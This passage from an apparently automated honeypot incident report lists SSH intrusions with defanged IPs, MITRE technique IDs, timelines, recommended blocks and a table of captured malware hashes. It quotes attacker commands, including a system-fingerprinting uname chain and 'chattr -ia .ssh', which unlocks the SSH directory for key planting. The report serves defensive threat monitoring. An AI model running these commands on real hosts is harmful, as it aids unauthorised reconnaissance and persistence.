| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:24` | `cowrie.session.connect` |
| `2026-07-04 22:47:25` | `cowrie.login.success` |
| `2026-07-04 22:47:25` | `cowrie.session.params` |
| `2026-07-04 22:47:25` | `cowrie.log.closed` |
| `2026-07-04 22:47:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d74bf7fd9f

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:25` | `cowrie.session.connect` |
| `2026-07-04 22:47:26` | `cowrie.login.success` |
| `2026-07-04 22:47:26` | `cowrie.session.params` |
| `2026-07-04 22:47:26` | `cowrie.log.closed` |
| `2026-07-04 22:47:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d0c587d9be4

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:26` | `cowrie.session.connect` |
| `2026-07-04 22:47:27` | `cowrie.login.success` |
| `2026-07-04 22:47:27` | `cowrie.session.params` |
| `2026-07-04 22:47:27` | `cowrie.log.closed` |
| `2026-07-04 22:47:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d4b1dd6a369

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:27` | `cowrie.session.connect` |
| `2026-07-04 22:47:28` | `cowrie.login.success` |
| `2026-07-04 22:47:28` | `cowrie.session.params` |
| `2026-07-04 22:47:28` | `cowrie.log.closed` |
| `2026-07-04 22:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00e8a6b0f688

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:28` | `cowrie.session.connect` |
| `2026-07-04 22:47:29` | `cowrie.login.success` |
| `2026-07-04 22:47:29` | `cowrie.session.params` |
| `2026-07-04 22:47:29` | `cowrie.log.closed` |
| `2026-07-04 22:47:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98d4776cd45e

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:29` | `cowrie.session.connect` |
| `2026-07-04 22:47:30` | `cowrie.login.success` |
| `2026-07-04 22:47:30` | `cowrie.session.params` |
| `2026-07-04 22:47:30` | `cowrie.log.closed` |
| `2026-07-04 22:47:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa95fcb791db

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:30` | `cowrie.session.connect` |
| `2026-07-04 22:47:31` | `cowrie.login.success` |
| `2026-07-04 22:47:31` | `cowrie.session.params` |
| `2026-07-04 22:47:31` | `cowrie.log.closed` |
| `2026-07-04 22:47:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-798d5a5ecd13

| Field | Detail |
|---|---|
| **Source IP** | `85.121.177[.]73` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:31` | `cowrie.session.connect` |
| `2026-07-04 22:47:32` | `cowrie.login.success` |
| `2026-07-04 22:47:32` | `cowrie.session.params` |
| `2026-07-04 22:47:32` | `cowrie.log.closed` |
| `2026-07-04 22:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.121.177[.]73` to AbuseIPDB if not already reported
- [ ] Block `85.121.177[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ffa3157bc1

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:47 |
| **Last Seen** | 2026-07-04 22:47 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:47:34` | `cowrie.session.connect` |
| `2026-07-04 22:47:36` | `cowrie.client.version` |
| `2026-07-04 22:47:36` | `cowrie.client.kex` |
| `2026-07-04 22:47:45` | `cowrie.login.success` |
| `2026-07-04 22:47:50` | `cowrie.session.params` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.success` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:50` | `cowrie.command.input` |
| `2026-07-04 22:47:53` | `cowrie.log.closed` |
| `2026-07-04 22:47:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d85c23ceaef

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:49 |
| **Last Seen** | 2026-07-04 22:49 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:49:34` | `cowrie.session.connect` |
| `2026-07-04 22:49:36` | `cowrie.client.version` |
| `2026-07-04 22:49:36` | `cowrie.client.kex` |
| `2026-07-04 22:49:46` | `cowrie.login.success` |
| `2026-07-04 22:49:51` | `cowrie.session.params` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.success` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:51` | `cowrie.command.input` |
| `2026-07-04 22:49:54` | `cowrie.log.closed` |
| `2026-07-04 22:49:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-406964f88578

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:51 |
| **Last Seen** | 2026-07-04 22:51 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:51:36` | `cowrie.session.connect` |
| `2026-07-04 22:51:38` | `cowrie.client.version` |
| `2026-07-04 22:51:38` | `cowrie.client.kex` |
| `2026-07-04 22:51:47` | `cowrie.login.success` |
| `2026-07-04 22:51:52` | `cowrie.session.params` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.success` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:52` | `cowrie.command.input` |
| `2026-07-04 22:51:55` | `cowrie.log.closed` |
| `2026-07-04 22:51:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdbb9c77184e

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]217` |
| **First Seen** | 2026-07-04 22:53 |
| **Last Seen** | 2026-07-04 22:54 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:53:35` | `cowrie.session.connect` |
| `2026-07-04 22:53:38` | `cowrie.client.version` |
| `2026-07-04 22:53:38` | `cowrie.client.kex` |
| `2026-07-04 22:53:49` | `cowrie.login.success` |
| `2026-07-04 22:53:54` | `cowrie.session.params` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.success` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:54` | `cowrie.command.input` |
| `2026-07-04 22:53:57` | `cowrie.log.closed` |
| `2026-07-04 22:54:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]217` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]217` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bdbdce13178

| Field | Detail |
|---|---|
| **Source IP** | `175.6.109[.]238` |
| **First Seen** | 2026-07-04 22:54 |
| **Last Seen** | 2026-07-04 22:54 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 22:54:46` | `cowrie.session.connect` |
| `2026-07-04 22:54:46` | `cowrie.client.version` |
| `2026-07-04 22:54:46` | `cowrie.client.kex` |
| `2026-07-04 22:54:47` | `cowrie.login.success` |
| `2026-07-04 22:54:48` | `cowrie.session.params` |
| `2026-07-04 22:54:48` | `cowrie.command.input` |
| `2026-07-04 22:54:48` | `cowrie.command.failed` |

**Recommended Actions:**
- [ ] Submit `175.6.109[.]238` to AbuseIPDB if not already reported
- [ ] Block `175.6.109[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `206.81.2[.]201` | **108** | 2026-07-04 20:55 | 2026-07-04 22:54 | 64m | 0 | `T1592` | 🟠 MEDIUM |
| `51.158.205[.]203` | **6** | 2026-07-04 22:06 | 2026-07-04 22:10 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | **4** | 2026-07-04 22:08 | 2026-07-04 22:11 | 4m | 0 | `T1592` | 🟢 LOW |
| `118.194.250[.]95` | **3** | 2026-07-04 21:32 | 2026-07-04 21:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `210.16.100[.]120` | **3** | 2026-07-04 21:10 | 2026-07-04 22:50 | 3m | 0 | `T1592` | 🟢 LOW |
| `101.126.67[.]255` | **2** | 2026-07-04 21:45 | 2026-07-04 21:47 | 4m | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | **2** | 2026-07-04 21:32 | 2026-07-04 22:02 | 1m | 0 | `T1592` | 🟢 LOW |
| `120.48.8[.]101` | **2** | 2026-07-04 21:33 | 2026-07-04 21:35 | 2m | 0 | `T1592` | 🟢 LOW |
| `139.59.147[.]236` | **2** | 2026-07-04 22:16 | 2026-07-04 22:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `14.29.248[.]43` | **2** | 2026-07-04 22:27 | 2026-07-04 22:29 | 2m | 0 | `T1592` | 🟢 LOW |
| `172.105.128[.]13` | **2** | 2026-07-04 22:21 | 2026-07-04 22:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]217` | **2** | 2026-07-04 22:18 | 2026-07-04 22:36 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.163.60[.]142` | **2** | 2026-07-04 21:37 | 2026-07-04 21:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `85.121.177[.]73` | **2** | 2026-07-04 22:46 | 2026-07-04 22:47 | 0m | 1 | `T1110.001` | 🟢 LOW |
| `103.242.104[.]81` | 1 | 2026-07-04 21:06 | 2026-07-04 21:07 | 33s | 0 | `T1592` | 🟢 LOW |
| `111.47.65[.]219` | 1 | 2026-07-04 22:11 | 2026-07-04 22:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.165[.]93` | 1 | 2026-07-04 21:37 | 2026-07-04 21:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.149.196[.]213` | 1 | 2026-07-04 21:43 | 2026-07-04 21:45 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]122` | 1 | 2026-07-04 21:44 | 2026-07-04 21:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `144.225.187[.]123` | 1 | 2026-07-04 21:14 | 2026-07-04 21:14 | 8s | 0 | `T1592` | 🟢 LOW |
| `161.35.211[.]5` | 1 | 2026-07-04 22:16 | 2026-07-04 22:17 | 20s | 0 | `T1592` | 🟢 LOW |
| `212.8.242[.]38` | 1 | 2026-07-04 21:54 | 2026-07-04 21:55 | 33s | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]90` | 1 | 2026-07-04 22:22 | 2026-07-04 22:22 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 68/100 | 🟡 MEDIUM | **22/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 62/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 80/100 | 🔴 HIGH | **26/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 53/100 | 🟡 MEDIUM | **34/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 41/100 | 🟡 MEDIUM | **28/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 64/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 77/100 | 🔴 HIGH | **19/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 61/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
